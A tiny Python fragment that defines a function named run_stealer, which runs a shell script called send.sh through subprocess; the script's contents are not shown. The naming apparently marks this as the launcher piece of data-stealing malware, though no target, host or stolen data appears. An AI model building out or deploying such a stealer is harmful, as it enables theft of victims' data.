import subprocess

def run_stealer():
    result = subprocess.run(
        ["bash", "send.sh"],
        check=True,
        text=True,
        #capture_output=True,
    )